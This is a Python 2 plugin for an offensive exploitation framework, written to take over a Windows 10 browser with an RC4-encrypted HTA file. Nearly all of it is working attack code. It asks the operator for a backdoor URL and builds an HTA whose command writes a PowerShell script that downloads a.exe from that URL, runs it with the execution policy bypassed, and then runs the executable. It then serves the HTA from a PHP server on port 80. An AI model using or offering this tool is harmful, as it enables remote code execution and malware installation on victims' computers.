Description = 'Takeover a windows 10 browser by encrypting the HTA file using RC4'

import re
import sys
import string
import time
import random
import sys
import os
import logging
from lxml import etree
from urlparse import urlparse
from struct import pack

plugin_description = "Takeover a windows 10 browser by encrypting the HTA file using RC4"
shelly = "shellcode"
intname = "rsf"
det = sys.argv[0]
dala = det.split('.')[-2]
fin = dala.split('plugins/')[-1]
__plugin__      = "%s.plugin" % (fin)
RescoursesDir = os.getcwd()
dandtime = time.strftime("%H:%M:%S")
logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)

class Tee(object):
  def __init__(self):
    self.file = open(logfile, 'a')
    self.stdout = sys.stdout

  def __del__(self):
    sys.stdout = self.stdout
    self.file.close()

  def write(self, data):
    self.file.write(data)
    self.stdout.write(data)

sys.stdout = Tee()

tree = etree.parse("storage/logs/config.xml")
for user in tree.xpath("/configuration/config/default_target"):
	ip = "%s" % (user.text)

def dash():
    while True:
        line_1 = "" + intname + "(\033[1;31m" + fin + "\033[1;m) > "
        terminal = raw_input(line_1).lower()
        time.sleep(0.5)
        if terminal == 'help':
            print "\n"
            print "Core Commands"
            print "============="
            print ""
            print "  Command         Description"
            print "  -------         -----------"
            print "  help            show help menu"
            print "  execute         run the plugin"
            print "  exit            exit the current plugin"
            print "  info            show plugin description"
            print ""
        elif terminal == 'execute':
            aner()
        elif terminal == "info":
            print plugin_description
            dash()
        elif terminal == 'exit':
            exit()
        else:
            print "Unknown syntax: %s" % (terminal)

def aner():
    default8 = "http://backdoor.url"
    time.sleep(0.2)
    print "\033[1;94m[?]\033[1;m URL :: Give a url of the backdoor you want to execute on the victims browser"
    url = raw_input('\033[1;92m[+]\033[1;m url: [' + default8 + ']: ') or default8
    yen = "yes"
    et = "yes"
    print ""
    print "Name             Set Value"
    print "----             ----------"
    print "Backdoor         %s" % (url)
    print "Plugin           %s" % (fin)
    print "\n"
    et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + yen + "]: ")  or yen
    if et == 'yes':
        os.system('cd plugins/Exploits && python shellgame-cli.py -k hello -c "cmd /c cd / & mkdir win & cd win & echo (wget "%s" -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & a.exe" -p Outlook.Application -o index.hta' % (url))
     	os.system('cd plugins && php -S 0.0.0.0:80 &>/dev/null')
 	print "[*] http://0.0.0.0:80"
    elif et == 'no':
        print "Goodbye ;("
        sys.exit()
    else:
        print "\033[1;92m[!] No options were chosen.\033[1;m"


dash()

